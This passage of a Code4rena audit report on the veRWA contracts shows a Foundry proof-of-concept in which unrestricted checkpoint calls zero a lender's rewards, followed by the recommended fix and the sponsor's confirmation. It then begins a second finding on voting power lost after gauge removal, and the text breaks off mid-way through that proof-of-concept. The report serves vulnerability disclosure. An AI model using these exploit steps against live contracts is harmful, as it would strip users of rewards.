</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5201314</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">goverance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fromEpoch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">toEpoch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountPerEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">goverance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">whiteListLendingMarket</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lender</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deltaStart</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epochStart</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync_ledger</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">deltaStart</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// gaps of 3 week</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deltaEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epochEnd</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">newTime</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync_ledger</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">deltaEnd</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;---sync ledger after set the update epoch to 0 --&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ledger.checkpoint_market(lendingMarket, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ledger.checkpoint_lender(lendingMarket, lender, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sync_ledger</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">deltaEnd</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fromEpoch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">toEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;No deposits for this user&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingMarket</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fromEpoch</span><span class=\"mtk1\">, </span><span class=\"mtk12\">toEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details><br>\n<p>If we run the POC, we get the normal result, user can claim and get 6 ETH as reward.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> ---</span><span class=\"mtk12\">sync</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ledger</span><span class=\"mtk1\"> </span><span class=\"mtk12\">after</span><span class=\"mtk1\"> </span><span class=\"mtk12\">set</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">update</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> --</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">6000000000000000000</span></span></span></code></pre>\n<p>If we uncomment:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// ledger.checkpoint_market(lendingMarket, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// ledger.checkpoint_lender(lendingMarket, lender, 0);</span></span></span></code></pre>\n<p>The claimed reward goes to 0.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add access control to checkpoint_market and checkpoint_lender.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/142#issuecomment-1680549736\">OpenCoreCH (veRWA) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This was a valid issue before the auditing contest (uncovered during the testing contest and fixed before the auditing contest), pasting my comment from there for reference:</p>\n<p>Good point. It is generally intended that everyone can call these functions (should not be necessary in practice, but may be in some edge cases where a market was inactive for years) and I do not think that this is problematic per se. However, the problem here is that users can decrease <code>lendingMarketBalancesEpoch</code> or <code>lendingMarketTotalBalanceEpoch</code>, which should never happen. So I will probably change the code like this (and the same for lenders) such that this can never happen:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">currEpoch</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Fill in potential gaps in the market total balances history</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastMarketBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lendingMarketTotalBalance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">][</span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">updateUntilEpoch</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">lendingMarketTotalBalance</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">lastMarketBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">updateUntilEpoch</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">lastMarketUpdateEpoch</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">lendingMarketTotalBalanceEpoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_market</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">updateUntilEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n</blockquote>\n<hr>\n<h2 id=\"h-08-if-governance-removes-a-gauge-users-voting-power-for-that-gauge-will-be-lost\" style=\"position:relative;\"><a href=\"#h-08-if-governance-removes-a-gauge-users-voting-power-for-that-gauge-will-be-lost\" aria-label=\"h 08 if governance removes a gauge users voting power for that gauge will be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/62\">[H-08] If governance removes a gauge, user’s voting power for that gauge will be lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/62\">thekmj</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/449\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/364\">popular00</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/349\">Eeyore</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/279\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/186\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/174\">0xCiphky</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/147\">ltyu</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/132\">0xbrett8571</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/87\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/409\">0xDetermination</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/353\">Tripathi</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/276\">Team_Rocket</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/81\">pep7siup</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L127-L132\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L127-L132</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L241\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L241</a></p>\n<p>If governance removes a gauge for any (non-malicious) reason, a user’s voting power for that gauge will be completely lost.</p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability details</h3>\n<p>The <code>GaugeController</code> is a solidity port of Curve DAO’s Vyper implementation. Users are to vote for channeling incentives by using the <code>vote_for_gauge_weights()</code> function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).</p>\n<p>One modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user’s voting power before removal is not reset. Since <code>vote_for_gauge_weights()</code> does not allow voting for removed gauges, the voting power is then forever lost.</p>\n<p>Consider the following scenario:</p>\n<ul>\n<li>Alice has some veRWA, and is now able to vote.</li>\n<li>She votes on some pool, say, G1, using 100% of her voting power.</li>\n<li>Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.</li>\n<li>Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.</li>\n</ul>\n<p>It is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Users can lose their voting power.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>We provide the following POC to use on <code>GaugeController</code> tests.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPOC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// prepare</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">v</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">, </span><span class=\"mtk12\">v</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">v</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// add gauges</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// all-in on gauge1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// governance removes gauge1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// cannot vote for gauge2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 